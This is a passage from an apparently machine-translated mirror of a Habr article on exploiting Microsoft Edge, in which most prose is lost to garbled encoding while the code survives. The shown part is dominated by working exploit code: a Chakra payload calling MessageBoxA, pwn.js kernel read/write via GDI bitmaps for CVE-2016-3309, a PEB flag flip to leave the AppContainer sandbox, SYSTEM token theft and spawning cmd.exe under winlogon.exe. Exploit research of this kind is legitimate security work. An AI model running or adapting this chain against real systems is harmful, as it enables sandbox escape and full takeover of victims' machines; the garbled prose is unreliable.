' + chakraBase.toString(16)); var MessageBoxA = importFunction('user32.dll', 'MessageBoxA', Int32); var GetActiveWindow = importFunction('user32.dll', 'GetActiveWindow', Int64); var hwnd = GetActiveWindow(); var ret = MessageBoxA(hwnd, new CString('PWNED'), new CString('PWNED'), 0); } }</span></span></code> </pre> <br><p>      : </p><br><p><img src="https://habrastorage.org/webt/vm/zb/t1/vmzbt1z0du0bnjto8mxpwzo9hac.png" alt="铺好的"></p><br><h2 id="shag-3-povyshenie-privilegiy-i-vyhod-iz-pesochnicy-s-pomoschyu-uyazvimosti-yadra">  3.           </h2><br><p>         <code>WinAPI</code> .         .      <code>CVE-2016-3309</code> .         [7]  [8],     <code>pwn.js</code> [2]    ,        <code>GDI</code> -.         [9], [10]  [11].              .        ,      .       ,                <code>AppContainer</code> ,          <code>pwn.js</code> .           <code>cmd.exe</code>    <code>SYSTEM</code> . </p><br><blockquote> GDI —   Windows          , ,    . </blockquote><p> ,             . <code>JS</code> -     64-     <code>kernel_read_64</code>  <code>kernel_write_64</code> , .        Windows.           <code>BITMAP</code> ,    . <code>pwn.js</code>     .  <code>BITMAP</code>  , , : </p><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> BITMAP = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StructType([ [<span class="hljs-string"><span class="hljs-string">'poolHeader'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayType(Uint32, <span class="hljs-number"><span class="hljs-number">4</span></span>)], <span class="hljs-comment"><span class="hljs-comment">// BASEOBJECT64 ['hHmgr', Uint64], ['ulShareCount', Uint32], ['cExclusiveLock', Uint16], ['BaseFlags', Uint16], ['Tid', Uint64], ['dhsurf', Uint64], ['hsurf', Uint64], ['dhpdev', Uint64], ['hdev', Uint64], ['sizlBitmap', SIZEL], ['cjBits', Uint32], ['pvBits', Uint64], ['pvScan0', Uint64], ]);</span></span></code> </pre> <br><p>  <code>Tid</code>       <code>KTHREAD</code>     , ,   ,   <code>EmpCheckErrataList</code> ,        .  ,        : </p><br><pre> <code class="javascript hljs">... var nt_EmpCheckErrataList_ptr = worker_bitmap_obj.Tid.add(<span class="hljs-number"><span class="hljs-number">0x2a8</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> nt_EmpCheckErrataList = kernel_read_64(nt_EmpCheckErrataList_ptr); <span class="hljs-comment"><span class="hljs-comment">/* g_config   ,         empCheckErrataList  WinDbg        : ? nt!EmpCheckErrataList - nt */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ntoskrnl_base_address = nt_EmpCheckErrataList.sub( g_config.nt_empCheckErrataList_offset); ...</code> </pre> <br><p>    ,     <code>AppContainer</code>    .    <code>AppContainer</code>    <code>IsPackagedProcess</code>     ( <code>Process Environment Block</code> , <code>PEB</code> ),         .    <code>Access Token</code> ,         <code>AppContainer</code> .       <code>Access Token</code>  ,         . <code>Access Token</code>     ,     .     <code>EPROCESS</code>    <code>ActiveProcessLinks</code> ,       .   <code>PEB</code>     <code>EPROCESS</code> .          <code>PsInitialSystemProcess</code> ,   ,         <code>ActiveProcessLinks</code> . </p><br><p>    <code>Edge</code>    :      ,    <code>Edge</code>       .              <code>SYSTEM</code> .   , , <code>winlogon.exe</code> . </p><br><p>        <code>pwn.js</code>  : </p><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//  PEB   var pinfo = _PROCESS_BASIC_INFORMATION.Ptr.cast(malloc(_PROCESS_BASIC_INFORMATION.size)); var pinfo_sz = Uint64.Ptr.cast(malloc(8)); NtQueryInformationProcess(GetCurrentProcess(), 0, pinfo, _PROCESS_BASIC_INFORMATION.size, pinfo_sz); var peb = pinfo.PebBaseAddress; /*    IsPackagedProcess       peb   char * */ var bit_field = peb[3]; bit_field = bit_field.xor(1 &lt;&lt; 4); peb[3] = bit_field; /*             WinDbg    .     : dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks           */ var ActiveProcessLinks = system_eprocess.add( g_config.ActiveProcessLinksOffset); var current_pid = GetCurrentProcessId(); var current_eprocess = null; var winlogon_pid = null; // winlogon.exe -  ,     cmd.exe var winlogon = new CString("winlogon.exe"); var image_name = malloc(16); var system_pid = kernel_read_64(system_eprocess.add( g_config.UniqueProcessIdOffset)); while(!current_eprocess || !winlogon_pid) { var eprocess = kernel_read_64(ActiveProcessLinks).sub( g_config.ActiveProcessLinksOffset); var pid = kernel_read_64(eprocess.add( g_config.UniqueProcessIdOffset)); //        //   Uint64.store( image_name.address, kernel_read_64(eprocess.add(g_config.ImageNameOffset)) ); Uint64.store( image_name.address.add(8), kernel_read_64(eprocess.add(g_config.ImageNameOffset + 8)) ); //   winlogon.exe    if(_stricmp(winlogon, image_name).eq(0)) { winlogon_pid = pid; } if (current_pid.eq(pid)) { current_eprocess = eprocess; } //        ActiveProcessLinks = eprocess.add( g_config.ActiveProcessLinksOffset); } //     var sys_token = kernel_read_64(system_eprocess.add(g_config.TokenOffset)); //          //   winlogon.exe var pi = malloc(24); memset(pi, 0, 24); var si = malloc(104 + 8); memset(si, 0, 104 + 8); Uint32.store(si.address, new Integer(104 + 8)); var args = WString("cmd.exe"); var AttributeListSize = Uint64.Ptr.cast(malloc(8)); InitializeProcThreadAttributeList(0, 1, 0, AttributeListSize); var lpAttributeList = malloc(AttributeListSize[0]); Uint64.store( si.address.add(104), lpAttributeList ); InitializeProcThreadAttributeList(lpAttributeList, 1, 0, AttributeListSize) var winlogon_handle = Uint64.Ptr.cast(malloc(8)); //       kernel_write_64(current_eprocess.add(g_config.TokenOffset), sys_token); /*        AppContainer,       winlogon.exe         winlogon.exe */ winlogon_handle[0] = OpenProcess(PROCESS_ALL_ACCESS, 0, winlogon_pid); UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, winlogon_handle, 8, 0, 0); CreateProcess(0, args, 0, 0, 0, EXTENDED_STARTUPINFO_PRESENT, 0, 0, si, pi);</span></span></code> </pre> <br><p>     : </p><br><p><img src="https://habrastorage.org/webt/r4/4j/lm/r44jlmrlc0reurbxe-rosf1cicu.png" alt="决赛"></p><br><p>   YouTube    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="></a>  ,     Microsoft Edge. </p><br><h2 id="itog"> 总结 </h2><br><p>   : </p><br><ul><li> ,       <code>Edge</code>   <code>Windows</code> ,   13   ,        <code>CVE-2017-0240</code>  ,   .          <code>CVE-2016-3309</code> . </li><li>      <code>JS</code> </li><li>    666    <code>JS</code> </li><li>   :  <code>cmd.exe</code>    <code>SYSTEM</code> ,        </li></ul><br><p>   ,         ,                 .  ,       ,         .        . </p><br><h2 id="materialy">  </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Liu Jin — The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Andrew Wesie, Brian Pak — 1-Day Browser &amp; Kernel <br> Exploitation</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Natalie Silvanovich — The ECMA and the Chakra. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Natalie Silvanovich — Your Chakra Is Not Aligned. Hunting bugs in the Microsoft Edge Script Engine</a> </li><li> <a href="">phoenhex team — cve-2018-8629-chakra.js</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Quarkslab — Exploiting MS16-145: MS Edge TypedArray.sort Use-After-Free (CVE-2016-7288)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Siberas — Kernel Exploitation Case Study — "Wild" Pool Overflow on Win10 x64 RS2 (CVE-2016-3309 Reloaded)</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Saif El-Sherei — Demystifying Windows Kernel Exploitation by Abusing GDI Objects</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Diego Juarez — Abusing GDI for ring0 exploit primitives</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Nicolas A. Economou — Abusing GDI for ring0 exploit <br> primitives: Evolution</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">pwn.js</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN455594/">https://habr.com/ru/post/zh-CN455594/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN455584/index.html">对公司内部力量的定制采访：从错误到发现</a></li>
<li><a href="../zh-CN455586/index.html">德国波鸿神经信息研究所（INI）所长GregorSchöner教授举办的机器人技术讲座系列</a></li>
<li><a href="../zh-CN455588/index.html">如何教育您的社区，以免手鼓跳舞</a></li>
<li><a href="../zh-CN455590/index.html">PostgreSQL-8中的MVCC。 冻结</a></li>
<li><a href="../zh-CN455592/index.html">攻击工业企业的病毒对物理安全构成威胁</a></li>
<li><a href="../zh-CN455596/index.html">DevConfX ::管理-简单的经理报告</a></li>
<li><a href="../zh-CN455598/index.html">紧急将Exim升级到4.92-存在主动感染</a></li>
<li><a href="../zh-CN455600/index.html">3DEXPERIENCE平台有助于创造未来的公共交通</a></li>
<li><a href="../zh-CN455602/index.html">行为模糊引起浏览器崩溃</a></li>
<li><a href="../zh-CN455604/index.html">Ansible用于管理Windows配置。 成功故事</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>